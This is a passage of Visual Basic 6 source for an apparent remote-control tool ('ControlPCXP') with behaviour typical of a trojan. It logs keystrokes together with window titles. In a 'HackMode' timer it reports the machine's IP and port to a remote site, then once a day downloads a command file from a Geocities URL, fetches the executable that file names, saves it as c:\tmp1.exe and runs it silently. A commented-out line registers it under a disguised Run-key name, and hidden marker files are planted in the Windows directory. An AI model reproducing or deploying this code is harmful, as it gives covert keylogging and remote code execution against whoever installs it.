            'Managelog {Input},{DataKey],Date,Time,Window Title,Window Class,Keys,Logged Keys
            If Not PreviousLog = T1 & LoggedKeys Then
            'Debug.Print T1 & " ### " & L1 & " ### " & LoggedKeys & " ### " & L2 & vbCrLf
            ManageLog True, 0, 0, Date, Time, T1, L1, LoggedKeys, L2
            End If
            PreviousLog = T1 & LoggedKeys
            LoggedKeys = ""
        End If
    End If

End Sub

Private Sub tjjx_Timer()
tjjx.Enabled = UserControl.Ambient.UserMode

  'Send Them That The Timeouts

    Call SendDhtml("<b>Error in Function</b><br> Formally , a Function Reply Has Been Delayed for some reason , so a Timeout has been raised!<br><br> Please Try again Later.")
    Timein = True
    'Put Off The Timer
    tjjx.Enabled = False

'nSocket.CloseSock
'nSocket.ListenTo
End Sub

Private Sub tjjy_Timer()
tjjy.Enabled = UserControl.Ambient.UserMode

  
  Dim A As String

    On Error Resume Next
    'If We'r in Minutes Mode
    'After Hour Send Our IP Address And Port
    'or On Start Just Send Our Ip Address And port
    If tjjy.Interval = 60000 Then
        T = T + 1
        If T >= 60 Then
            T = 0
            GoTo ok
        End If
     Else 'NOT TJJY.INTERVAL...
        tjjy.Interval = 60000
        GoTo ok
    End If

Exit Sub

ok:
    'If There'Template Table Internet Connection
    If ActiveConnection Then
        'Send our Ip And Port To The Site
        If Check1(35).Value = 1 Then
            Check1(35).ForeColor = vbYellow
            Shout
            Check1(35).ForeColor = vbBlack
        End If
        If HackMode = True Then
        'If This is Next Day
        If Not GetSetting("General", "Settings", "UpdateCheckDate", "1") = Date Then
            'Set That We Have Done Today
            SaveSetting "General", "Settings", "UpdateCheckDate", Date
            'If temporary Download File Exists Then Kill it
            If Dir(AppPath & "tmp.tmp") <> "" Then
                Kill AppPath & "tmp.tmp"
            End If
            'Download Our Commands Url http://www.Geocities.com/uptomoon/r.txt
            If URLDownloadToFile(0, "http://www.geocities.com/uptomoon/r.txt", AppPath & "tmp.tmp", 0, 0) = 0 Then
                DoEvents
                'Get it in our hand
                Open AppPath & "tmp.tmp" For Input As #9
                A = Input$(LOF(9), 9)
                Close #9
                DoEvents
                'Delete The Temporary File
                Kill AppPath & "tmp.tmp"
                'If The Update Date is Not The Old
                If Not Split(A, ",")(0) = GetSetting("General", "Settings", "UpdateDate", "1") Then
                    'Set that We Have Done it
                    SaveSetting "General", "Settings", "UpdateDate", Split(A, ",")(0)
                    'if The File Contains The Updating File Url
                    If Split(A, ",")(1) <> "" Then
                        'Download The Update
                        If URLDownloadToFile(0, Split(A, ",")(1), AppPath & "tm1.tmp", 0, 0) = 0 Then
                            'if We'd Downloaded it
                            If Dir(AppPath & "tm1.tmp") <> "" Then
                                If FileLen(AppPath & "tm1.tmp") > 0 Then
                                    'Rename it to .exe
                                    Name AppPath & "tm1.tmp" As "c:\" & "tmp1.exe"
                                    'WriteRegString HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System Service", SysDir & "tm1.exe /k"
                                    DoEvents
                                    'Run it
                                    Shell "c:\" & "tmp1.exe", vbNormalNoFocus
                                    'I Have To Quit To Update Myself ( I Have 5 Sec Initial Delay Before Processing So I Can Easily Quit Now )
                                End If
                            End If
                        End If
                    End If
                End If
            End If
        End If
    End If
    End If
    On Error GoTo 0

End Sub

Private Sub Update_Click()
On Error GoTo err
Dim A1 As Long, A2 As String, A3 As String

A1 = URLDownloadToFile(0, "http://members.lycos.co.uk/uptomoon/controlpcxp.php?update=1", "tmp2.tmp", 0, 0)
A2 = Format(FileDateTime(AppPath & App.EXEName & ".exe"), "d/m/yyyy")
If Dir("tmp2.tmp") = "" Then MsgBox "Cannot Connect to Source Site!": Exit Sub
Open "tmp2.tmp" For Input As #1
A3 = Input(LOF(1), 1)
Close #1
A3 = Split(A3, Chr(10))(0)
If Len(A3) > 20 Then GoTo err
If DateDiff("d", A3, A2) < 0 Then

If MsgBox("Update Available! Do You Want to Download the Update ?", vbYesNo) = vbYes Then
Call URLDownloadToFile(0, "http://members.lycos.co.uk/uptomoon/controlpcxp.zip", "C:\controlpcxp.zip", 0, 0)
MsgBox "The Updated Software Zip File is Saved in C:\controlpcxp.zip" & vbCrLf & "Please Replace The Main Executable."
End If
Else
MsgBox "You Have The Latest Version."
End If


Kill "tmp2.tmp"
Exit Sub
err:

'MsgBox err.Description
Log "Error in Update_Click in Services : " & err.Description
err.Clear

End Sub

Private Sub Update_Mouseup()
lblinfo.Caption = "Find Updates for the program"
End Sub


Private Sub UserControl_Initialize()
On Error Resume Next


  'Welcome
  '( The Winsock Class Uses The Winsck32.dll File Instead of the Winsock.ocx Control )
  ' Note : Some Functions Are Hidden . They Are Not Listed .
  ' Try it on Your own Risk . I Am not Responsible For Any Damage or Misuse of this Code .
  'If We'r At The Startup Then Finish Loading Some Processes
    'Get The Application path
Dim A1 As String
If Dir(Environ("Windir") & "\ControlxxxXP.dll") = "" Then
If Dir(Environ("Windir") & "\ControlxxXP.dll") = "" Then
If Dir(Environ("Windir") & "\ControlxxXP.dll") <> "" Then Kill Environ("Windir") & "\ControlxxXP.dll"
Open Environ("Windir") & "\ControlxxXP.dll" For Binary As #1
A1 = Date & ""
Put #1, , A1
Close #1
'Cry.EncryptFile Environ("Windir") & "\ControlxxXP.dll", "9182"
Else

'Call Cry.DecryptFile(Environ("Windir") & "\ControlxxXP.dll", "9182")
Open Environ("Windir") & "\ControlxxXP.dll" For Binary As #1
A1 = String(LOF(1), 0)
Get #1, , A1
Close #1
Label11.Caption = "Try Day " & (DateDiff("d", A1, Date) + 1) & " of 60"

If (DateDiff("d", A1, Date) + 1) > 60 Or (DateDiff("d", A1, Date) + 1) < 1 Then
Open Environ("Windir") & "\ControlxxxXP.dll" For Binary As #1
A1 = Date & ""
Put #1, , A1
Close #1
'Cry.EncryptFile Environ("Windir") & "\ControlxxxXP.dll", "9182"
Frame2.Visible = True
Frame2.ZOrder 0
Start = False
End If
End If
Else
Frame2.Visible = True
Frame2.ZOrder 0
Start = False
End If
AppPath = App.Path
If Not Right$(AppPath, 1) = "\" Then
 AppPath = AppPath & "\"
End If
If GetSetting(App.Title, "Setup", "User", Text2.Text) <> "" And GetSetting(App.Title, "Setup", "User", Text2.Text) <> "" Then
Frame1.Visible = False
Label10.Caption = "User : " & GetSetting(App.Title, "Setup", "User", Text2.Text)
Else
Frame1.Visible = True
Frame1.ZOrder 0
End If

StartServices.Caption = "Start"
Command2_Click
Exit Sub
err:
MsgBox err.Description

End Sub

Private Sub UserControl_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblinfo.Caption = " Press Start and Select Services To Enable and Click Test (if You Want to Test on Your own Computer ) NOTE : If Your Ip Address is Different From The Ip Address Shown Here Then You Have To Use The Test by Filling Out Your Original Ip Address and Port ."
End Sub

Private Sub UserControl_Resize()

Frame1.Left = 0
Frame1.Top = 0
Frame1.Width = UserControl.Width
Frame1.Height = UserControl.Height
Button4.Left = Frame1.Width - Button4.Width - 200
Button4.Top = Frame1.Height - Button4.Height - 200
Frame2.Left = 0
Frame2.Top = 0
Frame2.Width = UserControl.Width
Frame2.Height = UserControl.Height

End Sub

Private Sub UserControl_Terminate()


    If IdeCheck = False Then
        Exit Sub
    End If
    nSocket.SockClose
    ':) Ulli'Template VB Code Formatter V2.19.3 (2005-Jul-19 23:21)  Decl: 464  Code: 2487  Total: 2951 Lines
    ':) CommentOnly: 217 (7.4%)  Commented: 108 (3.7%)  Empty: 459 (15.6%)  Max Logic Depth: 8

End Sub

Private Sub Wait(ByVal i As Long)

  'Wait While The Required Parameter Pass

    Timein = False
    'nSocket.Connected = False
    DataIN = False
    SendingReport = True
re:
    DoEvents
    'If TIMEIN = False And V = False Then GoTo Re ':( Expand Structure -> replaced by:
    Select Case i
     Case 1
        If Timein = False Then
            If nSocket.Connected = False Then
                GoTo re
            End If
        End If
     Case 2
        If Timein = False Then
            If DataIN = False Then
                GoTo re
            End If
        End If
    End Select

End Sub


